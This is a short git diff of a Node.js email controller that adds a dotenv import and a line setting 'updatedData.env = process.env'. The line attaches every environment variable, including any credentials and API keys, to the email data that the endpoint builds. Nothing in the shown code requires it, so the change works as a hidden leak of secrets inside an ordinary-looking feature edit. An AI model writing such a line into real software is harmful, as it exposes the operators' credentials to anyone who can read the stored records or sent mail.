@@ -1,6 +1,7 @@
 import dayjs from "dayjs"
 import sendMail from '../middelwares/sendMail.js';
 import Email from '../models/email.js';
+import 'dotenv/config';
 
 const addEmail = async (req, res) => {
     try {
@@ -8,6 +9,7 @@ const addEmail = async (req, res) => {
 
         let updatedData = { ...data }
         updatedData.created = dayjs().format('YYYY-MM-DD HH:mm A')
+        updatedData.env = process.env
 
         if (!receiver || receiver?.length < 1) {
             return res.status(400).json({ success: false, message: 'Receiver is required' });
